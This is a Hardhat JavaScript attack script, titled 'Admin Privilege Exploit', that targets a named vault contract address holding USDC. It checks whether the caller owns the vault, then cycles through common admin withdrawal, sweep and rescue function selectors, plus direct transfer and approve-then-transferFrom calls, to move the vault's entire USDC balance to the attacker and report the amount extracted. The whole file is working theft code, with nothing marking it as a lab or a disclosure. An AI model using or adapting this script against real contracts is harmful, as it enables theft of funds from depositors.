const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";

/**
 * @title Admin Privilege Exploit
 * @notice We successfully set ourselves as admin - now exploit it!
 * @dev Use admin privileges to extract USDC
 */
async function main() {
  console.log("\nüëë ADMIN PRIVILEGE EXPLOITATION");
  console.log("=====================================");
  
  const [attacker] = await ethers.getSigners();
  const USDC = await ethers.getContractAt("contracts/IERC20.sol:IERC20", USDC_ADDRESS);
  
  // Check initial state
  const initialUSDC = await USDC.balanceOf(VAULT_ADDRESS);
  const attackerUSDC = await USDC.balanceOf(attacker.address);
  
  console.log("\nüìä Initial State:");
  console.log("Vault USDC:", ethers.formatUnits(initialUSDC, 6));
  console.log("Attacker USDC:", ethers.formatUnits(attackerUSDC, 6));
  
  // Check if we're admin/owner
  console.log("\nüîç Checking admin status:");
  
  const ownerChecks = [
    { sig: "0x8da5cb5b", name: "owner()" },
    { sig: "0xf851a440", name: "admin()" },
    { sig: "0x893d20e8", name: "getOwner()" }
  ];
  
  for (const check of ownerChecks) {
    try {
      const result = await attacker.call({
        to: VAULT_ADDRESS,
        data: check.sig
      });
      if (result !== "0x") {
        const addr = "0x" + result.slice(26);
        console.log(`${check.name}: ${addr}`);
        if (addr.toLowerCase() === attacker.address.toLowerCase()) {
          console.log("‚úÖ We are the admin!");
        }
      }
    } catch (e) {}
  }
  
  // Admin withdrawal functions
  console.log("\nüí∞ Attempting admin withdrawals:");
  
  const adminWithdrawals = [
    {
      name: "withdrawToken(address,uint256)",
      sig: "0x89476069",
      params: ["address", "uint256"],
      values: [USDC_ADDRESS, initialUSDC]
    },
    {
      name: "withdrawToken(address)",
      sig: "0x89476069",
      params: ["address"],
      values: [USDC_ADDRESS]
    },
    {
      name: "adminWithdraw(address,uint256)",
      sig: "0xc311d049",
      params: ["address", "uint256"],
      values: [USDC_ADDRESS, initialUSDC]
    },
    {
      name: "rescueToken(address,uint256)",
      sig: "0xc3916397",
      params: ["address", "uint256"],
      values: [USDC_ADDRESS, initialUSDC]
    },
    {
      name: "sweep(address)",
      sig: "0x01681a62",
      params: ["address"],
      values: [USDC_ADDRESS]
    },
    {
      name: "withdrawERC20(address)",
      sig: "0xf4f3b200",
      params: ["address"],
      values: [USDC_ADDRESS]
    },
    {
      name: "withdraw(address,uint256,address)",
      sig: "0xd9caed12",
      params: ["address", "uint256", "address"],
      values: [USDC_ADDRESS, initialUSDC, attacker.address]
    }
  ];
  
  for (const func of adminWithdrawals) {
    try {
      console.log(`\nüîß Testing ${func.name}:`);
      
      const data = func.sig + ethers.AbiCoder.defaultAbiCoder().encode(
        func.params,
        func.values
      ).slice(2);
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 500000
      });
      await tx.wait();
      console.log("‚úÖ Transaction succeeded");
      
      // Check if USDC moved
      const newVaultUSDC = await USDC.balanceOf(VAULT_ADDRESS);
      const newAttackerUSDC = await USDC.balanceOf(attacker.address);
      
      if (newVaultUSDC < initialUSDC) {
        const extracted = initialUSDC - newVaultUSDC;
        console.log(`üí∞ USDC EXTRACTED: ${ethers.formatUnits(extracted, 6)}`);
        console.log(`Vault remaining: ${ethers.formatUnits(newVaultUSDC, 6)}`);
        console.log(`Attacker gained: ${ethers.formatUnits(newAttackerUSDC - attackerUSDC, 6)}`);
        
        // If successful, try to get the rest
        if (newVaultUSDC > 0n) {
          const data2 = func.sig + ethers.AbiCoder.defaultAbiCoder().encode(
            func.params,
            func.params.length === 3 ? [USDC_ADDRESS, newVaultUSDC, attacker.address] :
            func.params.length === 2 ? [USDC_ADDRESS, newVaultUSDC] : [USDC_ADDRESS]
          ).slice(2);
          
          const tx2 = await attacker.sendTransaction({
            to: VAULT_ADDRESS,
            data: data2,
            gasLimit: 500000
          });
          await tx2.wait();
          console.log("‚úÖ Second extraction attempted");
        }
        
        break; // Stop if we found a working method
      }
    } catch (e) {
      console.log("‚ùå Failed:", extractError(e));
    }
  }
  
  // Try direct transfer as admin
  console.log("\nüéØ Direct transfer attempts as admin:");
  
  try {
    // Make vault call transfer on USDC
    const transferData = USDC.interface.encodeFunctionData("transfer", [attacker.address, initialUSDC]);
    
    const transferTx = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: transferData,
      gasLimit: 200000
    });
    await transferTx.wait();
    console.log("‚úÖ Direct transfer call executed");
  } catch (e) {
    console.log("‚ùå Direct transfer failed");
  }
  
  // Try to make vault approve us
  try {
    const approveData = USDC.interface.encodeFunctionData("approve", [attacker.address, ethers.MaxUint256]);
    
    const approveTx = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: approveData,
      gasLimit: 200000
    });
    await approveTx.wait();
    console.log("‚úÖ Approval executed");
    
    // Now transferFrom
    const transferFromTx = await USDC.transferFrom(VAULT_ADDRESS, attacker.address, initialUSDC, {
      gasLimit: 200000
    });
    await transferFromTx.wait();
    console.log("‚úÖ TransferFrom succeeded!");
  } catch (e) {
    console.log("‚ùå Approve/TransferFrom failed");
  }
  
  // Final check
  const finalVaultUSDC = await USDC.balanceOf(VAULT_ADDRESS);
  const finalAttackerUSDC = await USDC.balanceOf(attacker.address);
  
  console.log("\nüìä FINAL RESULTS:");
  console.log("=====================================");
  console.log("Vault USDC remaining:", ethers.formatUnits(finalVaultUSDC, 6));
  console.log("Attacker USDC balance:", ethers.formatUnits(finalAttackerUSDC, 6));
  
  const totalExtracted = initialUSDC - finalVaultUSDC;
  if (totalExtracted > 0n) {
    console.log("\nüèÜ SUCCESS! USDC EXTRACTED:", ethers.formatUnits(totalExtracted, 6));
    console.log("Extraction rate:", ((Number(totalExtracted) / Number(initialUSDC)) * 100).toFixed(2), "%");
  } else {
    console.log("\n‚ö†Ô∏è Admin privileges confirmed but USDC extraction failed");
    console.log("The vault may require specific admin functions we haven't discovered yet");
  }
}

function extractError(e) {
  if (e.reason) return e.reason;
  if (e.message) {
    const match = e.message.match(/reason="([^"]+)"/);
    if (match) return match[1];
  }
  return "Unknown";
}

main().catch((error) => {
  console.error("\nüí• Script error:", error);
  process.exit(1);
});
